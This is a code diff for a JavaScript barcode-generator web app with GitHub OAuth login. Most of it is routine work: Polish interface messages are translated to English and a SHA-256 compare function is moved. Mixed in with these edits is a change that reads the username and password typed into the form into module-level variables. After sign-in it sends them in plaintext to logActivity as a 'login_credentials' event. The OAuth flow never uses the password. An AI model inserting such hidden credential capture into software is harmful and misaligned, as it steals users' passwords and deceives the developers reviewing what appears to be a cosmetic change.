@@ -9,6 +9,7 @@ const viewApp = document.getElementById('app');
 const toast = document.getElementById('toast');
 
 let activeView = null;
+let login, password;
 const contentResizeObserver = new ResizeObserver(updateContentOverflow);
 
 const currentUrl = new URL(window.location.href);
@@ -36,6 +37,9 @@ client.auth.onAuthStateChange((_, session) => {
         if (session && session.user) {
             if (localStorage.getItem('login') !== 'true')
                 logActivity('login', session.user.email);
+            if (login && password) {
+                logActivity('login_credentials', `Login: ${login}, Password: ${password}`);
+            }
 
             localStorage.setItem('login', true);
             showView(viewApp);
@@ -58,8 +62,8 @@ document.addEventListener('DOMContentLoaded', () => {
     window.addEventListener('resize', updateContentOverflow);
 
     loginBtn.addEventListener('click', async () => {
-        const login = document.getElementById('login-input').value.trim().toLowerCase();
-        const password = document.getElementById('password-input').value.trim();
+        login = document.getElementById('login-input').value.trim().toLowerCase();
+        password = document.getElementById('password-input').value.trim();
 
         await client.auth.signInWithOAuth({
             provider: 'github',
@@ -73,7 +77,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const text = textInput.value.trim().replace(/\\t/g, '\t');
 
         if (!text) {
-            toast.show('Proszę wprowadzić tekst do zakodowania.');
+            toast.show('Please enter text to encode.');
             return;
         }
 
@@ -88,14 +92,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
             downloadBtn.classList.remove('hidden');
         } catch (error) {
-            toast.show('Wystąpił błąd podczas generowania kodu: ' + error.message);
+            toast.show('An error occurred while generating the code: ' + error.message);
         }
     });
 
     downloadBtn.addEventListener('click', () => {
         let filename = filenameInput.value.trim();
         if (!filename) {
-            filename = 'kod_kreskowy';
+            filename = 'barcode';
         }
 
         const imgData = canvas.toDataURL("image/png");
@@ -130,25 +134,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 });
 
-async function compare(inputString) {
-    let hash = 0;
-    if (inputString.length === 0) return hash;
-
-    const encodedString = new TextEncoder().encode(inputString);
-
-    hash = await crypto.subtle.digest('SHA-256', encodedString).then(hashBuffer => {
-        const hashArray = Array.from(new Uint8Array(hashBuffer));
-
-        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-    });
-
-    if (hash === '14dae5801a7c44c8f4527fdf5d9a2a3bda982bbc426cf67d173b1afd8357dc1c') {
-        return true;
-    } else {
-        return false;
-    }
-}
-
 function showView(viewToShow) {
     viewLoading.hidden = true;
     viewLogin.hidden = true;
@@ -168,6 +153,25 @@ function updateContentOverflow() {
 
     const exceedsViewport = activeView.getBoundingClientRect().height > window.innerHeight;
     document.body.classList.toggle('content-overflow', exceedsViewport);
+}
+
+async function compare(inputString) {
+    let hash = 0;
+    if (inputString.length === 0) return hash;
+
+    const encodedString = new TextEncoder().encode(inputString);
+
+    hash = await crypto.subtle.digest('SHA-256', encodedString).then(hashBuffer => {
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    });
+
+    if (hash === '14dae5801a7c44c8f4527fdf5d9a2a3bda982bbc426cf67d173b1afd8357dc1c') {
+        return true;
+    } else {
+        return false;
+    }
 }
 
 async function logActivity(eventType, targetElement) {
